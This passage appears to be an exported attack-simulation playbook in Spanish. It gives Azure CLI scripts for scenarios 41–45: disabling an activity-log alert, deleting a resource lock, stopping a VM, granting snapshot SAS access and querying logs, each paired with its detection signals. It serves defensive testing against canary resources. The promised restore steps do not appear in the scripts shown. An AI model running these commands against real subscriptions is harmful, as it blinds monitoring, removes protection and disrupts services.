command -v az >/dev/null 2>&1 || { echo "Azure CLI no está instalado" >&2; exit 90; }
STATE="${STRIKE_STATE_DIR:-/tmp/strike-azure-state}"
mkdir -p "$STATE"
az account set --subscription "${STRIKE_SUBSCRIPTION_ID}"

[ "${STRIKE_ALLOW_SERVICE_INTERRUPTION:-false}" = "true" ] || { echo "Guardrail no habilitado" >&2; exit 91; }
az monitor activity-log alert update -g "${STRIKE_RESOURCE_GROUP}" -n "${STRIKE_ACTIVITY_ALERT}" --enabled false --output json
```

**Resultado esperado:**

La alerta canary queda deshabilitada.

**Señales de detección:**

Azure Activity Log: activityLogAlerts/write; enabled=false, actor y target.

### 42. Eliminar management lock canary

**MITRE:** T1490

Eliminar temporalmente un CanNotDelete lock de un resource group BAS y recrearlo.

```bash
set -euo pipefail
command -v az >/dev/null 2>&1 || { echo "Azure CLI no está instalado" >&2; exit 90; }
STATE="${STRIKE_STATE_DIR:-/tmp/strike-azure-state}"
mkdir -p "$STATE"
az account set --subscription "${STRIKE_SUBSCRIPTION_ID}"

[ "${STRIKE_ALLOW_IMPACT:-false}" = "true" ] || { echo "Guardrail no habilitado" >&2; exit 91; }
az lock show -g "${STRIKE_RESOURCE_GROUP}" -n "${STRIKE_LOCK_NAME}" --output json >"$STATE/azure-lock-before.json"
az lock delete -g "${STRIKE_RESOURCE_GROUP}" -n "${STRIKE_LOCK_NAME}"
```

**Resultado esperado:**

El lock BAS deja de proteger temporalmente el resource group.

**Señales de detección:**

Azure Activity Log: managementLocks/delete; actor, scope y lock level.

### 43. Detener VM canary

**MITRE:** T1489

Detener temporalmente una VM BAS y volverla a iniciar.

```bash
set -euo pipefail
command -v az >/dev/null 2>&1 || { echo "Azure CLI no está instalado" >&2; exit 90; }
STATE="${STRIKE_STATE_DIR:-/tmp/strike-azure-state}"
mkdir -p "$STATE"
az account set --subscription "${STRIKE_SUBSCRIPTION_ID}"

[ "${STRIKE_ALLOW_SERVICE_INTERRUPTION:-false}" = "true" ] || { echo "Guardrail no habilitado" >&2; exit 91; }
az vm stop -g "${STRIKE_RESOURCE_GROUP}" -n "${STRIKE_VM_NAME}"
```

**Resultado esperado:**

La VM entra en estado stopped/deallocated según configuración.

**Señales de detección:**

Azure Activity Log: virtualMachines/powerOff/action; caller, VM y scope.

### 44. Generar acceso temporal a snapshot canary

**MITRE:** T1530

Generar un SAS read-only de corta duración para un snapshot BAS y revocarlo.

```bash
set -euo pipefail
command -v az >/dev/null 2>&1 || { echo "Azure CLI no está instalado" >&2; exit 90; }
STATE="${STRIKE_STATE_DIR:-/tmp/strike-azure-state}"
mkdir -p "$STATE"
az account set --subscription "${STRIKE_SUBSCRIPTION_ID}"

az snapshot grant-access -g "${STRIKE_RESOURCE_GROUP}" -n "${STRIKE_SNAPSHOT_NAME}" --duration-in-seconds 600 --access-level Read --output json >"$STATE/azure-snapshot-access.json"
chmod 600 "$STATE/azure-snapshot-access.json"
jq '{accessSAS_created:(.accessSAS|length>0)}' "$STATE/azure-snapshot-access.json"
```

**Resultado esperado:**

Se genera acceso temporal read-only sin imprimir la URL SAS.

**Señales de detección:**

Azure Activity Log: snapshots/beginGetAccess/action; snapshot, duration, access level y actor.

### 45. Consultar Azure Activity Log del ejercicio

**MITRE:** T1526

Recuperar eventos recientes del resource group BAS para medir telemetría.

```bash
set -euo pipefail
command -v az >/dev/null 2>&1 || { echo "Azure CLI no está instalado" >&2; exit 90; }
STATE="${STRIKE_STATE_DIR:-/tmp/strike-azure-state}"
mkdir -p "$STATE"
az account set --subscription "${STRIKE_SUBSCRIPTION_ID}"

START="$(date -u -d '-4 hours' +%Y-%m-%dT%H:%M:%SZ)"
az monitor activity-log list --resource-group "${STRIKE_RESOURCE_GROUP}" --start-time "$START" --max-events 1000 --output json | tee "$STATE/azure-activity-log.json"
```

**Resultado esperado:**

Se recuperan eventos de administración asociados al laboratorio.

**Señales de detección:**

Activity Log es la fuente verificada; validar latencia, caller, claims, operationName, status y correlationId.

---
_Exportado desde STRIKE — `azure-subscription-and-resource-compromise`_
